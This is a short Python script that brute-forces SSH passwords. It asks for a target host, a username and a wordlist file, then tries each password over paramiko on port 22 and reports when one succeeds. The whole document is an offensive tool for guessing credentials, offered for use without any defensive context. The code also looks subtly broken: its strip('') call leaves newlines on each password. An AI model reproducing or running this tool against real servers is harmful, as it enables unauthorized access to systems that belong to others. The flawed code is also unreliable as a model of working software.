import paramiko, os,socket, termcolor

class SSHPasswordCracking:
	target_adress=None
	ssh_username=None
		
	def compare_ssh_password(self,password, code=0):
		ssh=paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			ssh.connect(self.target_adress,port=22,username=self.ssh_username, password=password)
		except paramiko.AuthenticationException:
			code=1
		except socket.error:
			code=2
		finally:
			ssh.close()
		return code,password

	def get_started(self):
		self.target_adress= input(termcolor.colored('[+] Target Address:','yellow'))
		self.ssh_username= input(termcolor.colored('[+] SSH Username): ','blue'))
		filename= input(termcolor.colored('[+] Passwords Files: ','green'))
		
		filename='{}.txt'.format(str(filename))
		if not os.path.exists(filename):
			return print(termcolor.colored('[-] Directory doesn/t contain  {} '.format(filename),'red'))
		with open(filename, 'r') as file:
			for line in file.readlines():
				read_password_from_file=line.strip('')
				code, password=self.compare_ssh_password(read_password_from_file)
				if code==0:
					print(termcolor.colored('[+] Found password {} for account {}'.format(password,self.ssh_username),'green'))
				elif code==1:
					print(termcolor.colored('[-] Password was incorrect','red'))
				else:
					print(termcolor.colored('[-] Connection error','yellow'))
	
sshPassCrackObj=SSHPasswordCracking()
sshPassCrackObj.get_started()